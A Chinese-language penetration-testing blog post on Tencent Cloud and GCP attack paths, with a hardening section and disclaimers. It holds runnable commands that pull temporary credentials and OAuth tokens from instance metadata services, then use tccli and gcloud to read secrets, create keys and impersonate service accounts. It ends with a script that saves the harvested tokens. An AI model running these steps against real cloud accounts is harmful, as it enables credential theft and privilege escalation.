---
title: "云安全：腾讯云与GCP安全"
date: 2025-09-01 08:00:00
tags:
  - 云安全
  - 渗透测试
description: 腾讯云与 GCP 安全——CVM/COS 与 Compute Engine/Cloud Storage 安全测试。
categories: 渗透测试
---

## 前言

随着多云战略普及，攻击者越来越关注云平台横向移动与权限提升路径。腾讯云与 GCP 在元数据服务、对象存储、IAM 权限模型及 CLI 工具链上各有特色，也存在值得红队关注的安全风险。本文从渗透测试视角出发，分析两大平台的核心攻击面。

**声明：本文所述技术仅供安全研究与授权测试使用，未经授权对云资源进行访问或利用属违法行为。**

---

## 一、腾讯云 CVM 元数据服务

### 1.1 元数据端点

腾讯云 CVM 元数据监听 `169.254.0.23`，与 AWS/GCP 均不同。

```bash
# 基础信息
curl http://169.254.0.23/meta-data/
curl http://169.254.0.23/meta-data/instance-id
curl http://169.254.0.23/meta-data/local-ipv4
curl http://169.254.0.23/meta-data/app-id
```

### 1.2 CAM 角色临时凭证窃取

实例绑定 CAM 角色后，可获取临时安全凭证：

```bash
# 获取角色名
curl http://169.254.0.23/meta-data/cam/security-credentials/

# 获取 TmpSecretId / TmpSecretKey / Token
curl http://169.254.0.23/meta-data/cam/security-credentials/<ROLE_NAME>
```

返回 JSON 包含 `TmpSecretId`、`TmpSecretKey`、`Token`、`ExpiredTime`。

红队路径：获取 Shell → 窃取 CAM 临时凭证 → 横向移动至其他腾讯云服务。

### 1.3 凭证利用（tccli）

```bash
tccli configure set secretId    $TmpSecretId
tccli configure set secretKey   $TmpSecretKey
tccli configure set token       $Token
tccli configure set region      ap-guangzhou

# 信息枚举
tccli cvm DescribeInstances --region ap-guangzhou
tccli cos --region ap-guangzhou list-buckets
tccli cam ListUsers --region ap-guangzhou
tccli cam DescribeRoleList --region ap-guangzhou
tccli vpc DescribeSecurityGroups --region ap-guangzhou
```

若未安装 `tccli`，可通过 TC3-HMAC-SHA256 签名直接调用 HTTP API。

### 1.4 CAM 策略枚举与危险权限

```bash
tccli cam ListAttachedUserPolicies --name <username>
tccli cam GetPolicy --policy-id <policy-id>
tccli cam GetRole --role-name <role-name>
```

**常见危险权限组合：**

| 权限 | 风险 |
|------|------|
| `cam:CreateAccessKey` + `cam:AttachUserPolicy` | 创建密钥并提权，持久化 |
| `cvm:RunInstances` + `cam:PassRole` | 创建携带高权限角色的新实例 |
| `sts:AssumeRole` | 担任其他角色，横向移动 |
| `cam:UpdateAssumeRolePolicy` | 修改信任策略，建立后门 |

---

## 二、腾讯云 COS 对象存储

访问域名：`https://<bucket>-<appid>.cos.<region>.myqcloud.com`

### 2.1 公开桶探测

```bash
curl https://<bucket>-<appid>.cos.ap-guangzhou.myqcloud.com

for bucket in backup logs data static assets; do
  curl -s -o /dev/null -w "%{http_code}" \
    "https://${bucket}-<appid>.cos.ap-guangzhou.myqcloud.com"
done
```

### 2.2 持有凭证时的操作

```bash
tccli cos GetBucketAcl --region ap-guangzhou --bucket <bucket>-<appid>
tccli cos GetBucketPolicy --region ap-guangzhou --bucket <bucket>-<appid>
```

### 2.3 预签名 URL 风险

URL 中 `q-sign-time` 参数标识签名有效期。若有效期过长或范围过于宽泛，签名 URL 泄漏后可被滥用：

```
https://<bucket>.cos.ap-guangzhou.myqcloud.com/file.txt
  ?q-sign-algorithm=sha1
  &q-ak=AKIDxxxxxxxxxxxxx
  &q-sign-time=1693500000;1693600000
  &q-signature=xxxxxxxxxxxxx
```

若桶策略配置 `GrantEveryone` 或允许其他 UIN 访问，攻击者可利用自身 CAM 角色跨账号读写。

---

## 三、GCP Compute Engine 元数据服务

### 3.1 基础信息获取

GCP 元数据监听 `169.254.169.254`，需 `Metadata-Flavor: Google` 头。

```bash
curl http://169.254.169.254/computeMetadata/v1/project/project-id \
  -H "Metadata-Flavor: Google"
curl http://169.254.169.254/computeMetadata/v1/instance/id \
  -H "Metadata-Flavor: Google"
curl http://169.254.169.254/computeMetadata/v1/instance/service-accounts/ \
  -H "Metadata-Flavor: Google"
```

### 3.2 Access Token 窃取

```bash
# 获取 default SA 的 OAuth 2.0 token
curl http://169.254.169.254/computeMetadata/v1/\
instance/service-accounts/default/token \
  -H "Metadata-Flavor: Google"
# → {"access_token":"ya29.c.xxx","expires_in":3599,"token_type":"Bearer"}

# 获取 id_token（用于云函数/Cloud Run 鉴权）
curl "http://169.254.169.254/computeMetadata/v1/\
instance/service-accounts/default/identity?audience=https://example.com&format=full" \
  -H "Metadata-Flavor: Google"
```

关键点：即使服务账号密钥被禁用，元数据返回的临时令牌仍然有效；且默认 scope 包含 `cloud-platform` 全范围权限。

---

## 四、GCP gcloud CLI 渗透利用

### 4.1 激活凭证

```bash
# 通过 access token 激活
gcloud auth activate-service-account --access-token-file=<(
  curl -s http://169.254.169.254/computeMetadata/v1/\
instance/service-accounts/default/token \
    -H "Metadata-Flavor: Google" | jq -r '.access_token')

# 通过私钥 JSON 激活
gcloud auth activate-service-account --key-file=/path/to/key.json
```

### 4.2 信息收集

```bash
gcloud auth list
gcloud projects list
gcloud compute instances list
gcloud iam service-accounts list \
  --format="table(email,displayName,disabled)"
gcloud storage ls
gcloud sql instances list
gcloud secrets list
gcloud secrets versions access latest --secret=<secret-name>
```

### 4.3 权限枚举与提权

```bash
# 搜索 IAM 策略
gcloud asset search-all-iam-policies --scope=projects/<project-id>

# 查看 SA 密钥
gcloud iam service-accounts keys list \
  --iam-account=<sa>@<project>.iam.gserviceaccount.com

# 创建 SA 密钥（需 iam.serviceAccountKeys.create）
gcloud iam service-accounts keys create /tmp/sa-key.json \
  --iam-account=<sa>@<project>.iam.gserviceaccount.com

# 服务账号模拟（需 iam.serviceAccounts.actAs）
gcloud compute instances list \
  --impersonate-service-account=target-sa@<project>.iam.gserviceaccount.com
```

### 4.4 云函数 / Cloud Run 枚举

```bash
gcloud functions list
gcloud run services list
```

---

## 五、GCP Cloud Storage 利用

```bash
# 公开桶探测
curl https://storage.googleapis.com/<bucket-name>

# 利用 access token 枚举对象
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/<bucket>/o"

# 下载对象
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/<bucket>/o/<obj>?alt=media"

# IAM 策略查看
gcloud storage buckets get-iam-policy gs://<bucket>
```

---

## 六、GCP 提权矩阵

| 源权限 | 目标 | 手法 |
|-------|------|------|
| `iam.serviceAccounts.actAs` | 目标 SA 所有权限 | 服务账号模拟 |
| `iam.serviceAccountKeys.create` | 目标 SA 权限（持久化） | 创建密钥 |
| `iam.roles.update` | 任意权限 | 修改角色定义 |
| `cloudfunctions.functions.create` | 函数运行时 SA 权限 | 部署恶意云函数 |
| `compute.instances.setMetadata` | 实例 SA 权限 | 修改元数据执行命令 |
| `secretmanager.secrets.versions.access` | 读取凭据 | Secret Manager 访问 |

---

## 七、多云 IAM 对比表

### 7.1 核心概念

| 特性 | 腾讯云 CAM | GCP IAM |
|------|-----------|---------|
| 身份主体 | 子用户、协作者、角色、用户组 | 用户、SA、群组、工作负载联合 |
| 根账号 | 主账号（Owner UIN） | Organization 下项目拥有者 |
| 权限模型 | 允许 + 拒绝（显式拒绝优先） | 仅允许（无显式拒绝） |
| 策略语法 | JSON CAM 策略 | IAM Policy Binding |
| 临时凭证 | STS → TmpSecretId/Key/Token | OAuth 2.0 Access/ID Token |
| 资源层级 | 账号级（地域 + 业务隔离） | Org → Folder → Project → Resource |
| 条件键 | `qcs:` 前缀条件 | Condition 表达式 |
| 审计日志 | CloudAudit | Cloud Audit Logs |

### 7.2 服务身份绑定

| 场景 | 腾讯云 | GCP |
|------|--------|-----|
| 实例身份 | CAM 角色 → CVM | SA → GCE 实例 |
| 凭证获取 | `169.254.0.23` 临时凭证 | `169.254.169.254` OAuth Token |
| Serverless 身份 | SCF 运行角色 | Cloud Functions 运行时 SA |
| 对象存储鉴权 | CAM + Bucket ACL + 预签名 URL | IAM Policy + Signed URL |
| 跨账号访问 | 角色信任策略跨 UIN | IAM Binding 跨项目 SA |
| 身份联合 | SAML / OIDC | Workforce / Workload Identity Federation |

### 7.3 攻击面对比

| 攻击面 | 腾讯云 | GCP |
|--------|--------|-----|
| 元数据地址 | `169.254.0.23` | `169.254.169.254` |
| 令牌范围 | 与 CAM 角色策略一致 | 默认 `cloud-platform` 全范围 |
| Bearer 利用 | TC3-HMAC-SHA256 签名 | HTTP Header 直接使用 |
| 长期密钥 | CAM 密钥可长期有效 | SA JSON 密钥可长期有效 |
| 审计日志 | 管理事件默认，数据事件需开通 | Admin 默认，Data Access 需手动 |

---

## 八、多云元数据探测脚本

```bash
#!/bin/bash
# 云平台元数据探测

echo "[*] Probing Tencent Cloud..."
R=$(curl -s -o /dev/null -w "%{http_code}" http://169.254.0.23/meta-data/ --connect-timeout 2)
if [ "$R" = "200" ]; then
  echo "[+] Tencent Cloud CVM detected"
  ROLE=$(curl -s http://169.254.0.23/meta-data/cam/security-credentials/ --connect-timeout 2)
  [ -n "$ROLE" ] && curl -s "http://169.254.0.23/meta-data/cam/security-credentials/$ROLE" \
    --connect-timeout 2 > /tmp/tc_creds.json && echo "[+] Creds → /tmp/tc_creds.json"
fi

echo "[*] Probing GCP..."
R=$(curl -s -o /dev/null -w "%{http_code}" \
  http://169.254.169.254/computeMetadata/v1/project/project-id \
  -H "Metadata-Flavor: Google" --connect-timeout 2)
if [ "$R" = "200" ]; then
  echo "[+] GCP Compute Engine detected"
  TOKEN=$(curl -s http://169.254.169.254/computeMetadata/v1/\
instance/service-accounts/default/token \
    -H "Metadata-Flavor: Google" --connect-timeout 2 | jq -r '.access_token')
  PROJECT=$(curl -s http://169.254.169.254/computeMetadata/v1/project/project-id \
    -H "Metadata-Flavor: Google" --connect-timeout 2)
  echo "[+] Project: $PROJECT | Token: ${TOKEN:0:30}..."
  echo "$TOKEN" > /tmp/gcp_token.txt
fi
```

---

## 九、防御加固建议

### 腾讯云
- 最小权限：CAM 策略按需授予，定期审查 `Resource` 和 `Action`
- 为所有子用户/协作者启用 MFA
- CloudAudit 监控 `cam:CreateAccessKey`、`sts:AssumeRole` 等敏感操作
- COS 桶默认私有，禁用 `GrantEveryone`
- 高敏感实例限制对 `169.254.0.23` 的网络访问

### GCP
- Org Policy 约束：
- VPC Service Controls 限制数据外流
- 手动启用 Data Access 审计日志
- 使用 Workload Identity Federation 替代 SA 密钥
- 对不需要访问 GCP API 的实例使用 `--no-service-account`

---

## 十、总结

腾讯云与 GCP 在 IAM 设计上各具特色：GCP 扁平化角色绑定 + 服务账号模拟提供灵活性的同时也带来复杂权限链；腾讯云 CAM 遵循显式拒绝 + 条件键模型，学习曲线低但在多云互操作性和审计工具链上仍有完善空间。

理解不同云平台的元数据地址、凭证获取机制、对象存储鉴权方式以及 IAM 提权路径，是多云渗透测试的必要技能。随着云原生架构演进，攻击面从无服务器函数扩展到 Kubernetes 集群、从密钥管理扩展到身份联合，每个新服务都可能引入新的安全挑战。

---

**免责声明**

本文所有内容仅供安全研究与教育目的。文中涉及的技术、命令和示例仅用于帮助理解云平台安全机制，提升企业防护能力。未经系统所有者明确书面授权，对任何云资源进行未授权访问、测试或利用均属违法行为。作者不对因使用本文信息而导致的任何直接或间接损害承担责任。如发现漏洞，请通过各平台官方漏洞奖励计划（腾讯云安全应急响应中心、Google VRP）进行负责任披露。

*Security is a process, not a product. — Bruce Schneier*
